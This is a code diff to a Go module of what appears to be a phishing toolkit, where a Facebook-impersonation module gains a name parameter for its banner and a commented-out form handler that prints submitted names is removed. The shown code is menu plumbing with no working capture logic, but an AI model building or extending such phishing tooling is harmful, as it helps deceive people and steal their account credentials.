@@ -13,10 +13,11 @@ type Phishing struct {
 	url  string
 }
 
-func Facebook() {
+func Facebook(name string) {
 	var ph Phishing
 	helpers.Clear_screen()
-	fmt.Println(Colors.Red(), "\n\n["+Colors.White()+"*"+Colors.Red()+"]", Colors.White(), " Facebook module is loaded sucessfully\t")
+	helpers.Prompt()
+	fmt.Println(Colors.Red(), "\n\n["+Colors.White()+"*"+Colors.Red()+"]", Colors.White(), Colors.Red(), name, Colors.White(), " module is loaded sucessfully\t")
 	fmt.Println(Colors.Red(), "\n["+Colors.White()+"*"+Colors.Red()+"]", Colors.White(), " Select Mode\t")
 
 	fmt.Println(Colors.Red(), "\n\n--------------------------------------------------------------------------------------------------")
@@ -120,33 +121,3 @@ func Facebook() {
 	}
 
 }
-
-// func processor(w http.ResponseWriter, r *http.Request) {
-
-// 	if r.Method != "POST" {
-// 		http.Redirect(w, r, "/", http.StatusSeeOther)
-// 		return
-// 	}
-
-// 	fname := r.FormValue("firster")
-// 	lname := r.FormValue("laster")
-// 	// surf := r.FormValue("surf")
-// 	// snow := r.FormValue("snow")
-// 	// skate := r.FormValue("skate")
-// 	// radio := r.FormValue("cow")
-
-// 	fmt.Println(fname, lname)
-
-// 	// d := struct {
-// 	// 	First, Last, Surf, Snow, Skate, Radio string
-// 	// }{
-// 	// 	First: fname,
-// 	// 	Last:  lname,
-// 	// 	Surf:  surf,
-// 	// 	Snow:  snow,
-// 	// 	Skate: skate,
-// 	// 	Radio: radio,
-// 	// }
-
-// 	http.Redirect(w, r, "http://www.golang.org", http.StatusSeeOther)
-// }
